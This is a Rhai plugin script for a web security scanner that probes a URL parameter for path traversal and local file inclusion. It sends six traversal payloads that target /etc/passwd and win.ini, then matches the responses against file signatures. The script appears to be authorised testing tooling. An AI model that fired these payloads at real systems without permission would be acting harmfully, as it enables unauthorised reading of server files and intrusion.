// check-path-traversal.rhai — operator/agent command
// `check.path_traversal { url, param }`: confirm path traversal / local file
// inclusion by requesting a well-known system file and matching its signature.
// OWASP A01 Broken Access Control / A03 Injection.
//
// ACTIVE: scope-/rate-gated GETs, invoked only. It reads a universally-present
// marker file (/etc/passwd, win.ini) to prove traversal; it exfiltrates nothing
// else. For authorised testing only.
const NAME = "check-path-traversal";
const API  = "1";

fn q(url, param, value) {
    let sep = if url.contains("?") { "&" } else { "?" };
    `${url}${sep}${url_encode(param)}=${value}`
}

fn load(reg) {
    reg.add_command("check.path_traversal", "Confirm path traversal / LFI in { url, param }", |args| {
        if type_of(args.url) != "string" || type_of(args.param) != "string" {
            return "usage: check.path_traversal { url, param }";
        }
        let nix = "root:.*:0:0:";
        let win = "(?i)\\[(fonts|extensions|mci extensions)\\]";
        let payloads = [
            "../../../../../../../../etc/passwd",
            "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//....//etc/passwd",
            "/etc/passwd",
            "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
            "../../../../../../windows/win.ini",
        ];
        for pl in payloads {
            let r = http.send(#{ method: "GET", url: q(args.url, args.param, pl) });
            if r.status == () { continue; }
            if regex_match(nix, r.body) || regex_match(win, r.body) {
                finding(#{
                    name: "Path traversal / local file inclusion",
                    severity: "critical",
                    flow_id: r.flow_id,
                    detail: `\"${args.param}\" on ${args.url} returned the contents of a system file via traversal payload (${pl}).`,
                    tags: ["path-traversal", "lfi", "active", "owasp-a01", "owasp-a03"],
                });
                return "VULNERABLE: path traversal confirmed";
            }
        }
        "no path traversal confirmed"
    });
}
